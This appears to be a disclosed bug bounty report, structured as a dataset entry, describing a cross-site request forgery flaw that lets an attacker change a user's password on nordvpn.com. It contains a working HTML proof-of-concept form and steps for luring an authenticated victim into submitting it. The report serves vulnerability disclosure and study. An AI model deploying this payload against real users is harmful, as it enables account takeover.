title: CSRF to change password
content:
Description
Cross-Site Request Forgery (CSRF) is a type of attack that occurs when a malicious web site, email, blog, instant message, or program causes a user's web browser to perform an unwanted action on a trusted site for which the user is currently authenticated.
I have found CSRF to change password ,
POC
Code 356 Bytes
1  <body>
2    <form action="https://nordvpn.com/profile/" method="POST">
3      <input type="hidden" name="tmpl" value="settings" />
4      <input type="hidden" name="password" value="password" />
5      <input type="hidden" name="password_confirmation" value="password" />
6      <input type="submit" value="Submit request" />
7    </form>
8  </body>
9</html>
Thanks
steps: Create an HTML form with hidden inputs for the password and password confirmation fields, targeting the password change endpoint (https://nordvpn.com/profile/).
Trick an authenticated user into submitting this form (e.g., via phishing or malicious site embedding).
vuln_description: This is a Cross-Site Request Forgery (CSRF) vulnerability that allows an attacker to change a user's password without their consent or knowledge. The attack exploits the lack of CSRF tokens or other protections on the password change endpoint, allowing malicious requests to be submitted if the victim is authenticated.
reason: The vulnerability is straightforward to exploit once the password change endpoint is identified. It does not involve multiple components, complex states, or novel logic. The attack relies on basic web form submission mechanics and predictable endpoint behavior.
